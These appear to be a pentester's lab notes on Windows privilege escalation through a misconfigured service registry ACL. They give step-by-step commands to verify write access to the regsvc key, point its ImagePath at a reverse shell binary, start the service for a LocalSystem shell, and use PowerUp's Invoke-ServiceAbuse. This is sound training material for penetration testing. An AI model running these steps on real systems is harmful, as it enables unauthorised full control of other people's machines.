For each service, registry may be configured with ACLs. If this ACL is misconfigured it might be possible to modify a service’s configuration even if we are not allowed to do it directly.

[Good Article](https://medium.com/r3d-buck3t/abuse-service-registry-acls-windows-privesc-f88079140509)

a) We start by exploring results of winpeas and we got something interesting. We might be able to edit this registry “HKLM\system\currentcontrolset\services\regsvc”


b) Verifying the registry permissions:

i) Using Get-Acl cmdlet (Powershell)-

Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc |  Format-List *

“NT AUTHORITY\INTERACTIVE” has full control over this registry and if we list all the groups for our user, we find our current user is a part of this group.

whoami /groups

ii) Using accesschk.exe:

.\accesschk.exe /accepteula -uvqk HKLM\System\CurrentControlSet\Services\regsvc

c) Also we need to check weather we have permission to start and stop the service:

.\accesschk.exe /accepteula -ucqv user regsvc

d) Editing the registry:

i) First we need to determine what is available in registry to which we can change.

reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc

or we can use powershell also

Get-Item -path HKLM:\SYSTEM\CurrentControlSet\services\regsvc

We will modify the ImagePath to that of our reverse shell binary.

ii) Editing the ImagePath property:

A) using Powershell-

Set-Itemproperty -path 'HKLM:\SYSTEM\CurrentControlSet\services\regsvc' -Name 'ImagePath' -value 'C:\PrivEsc\reverse.exe'

B) Using reg command-

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

e) Starting the service to get reverse shell as LocalSystem-

net start regsvc

Using PoweUp.ps1-

Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName dcorp\student479 -Verbose
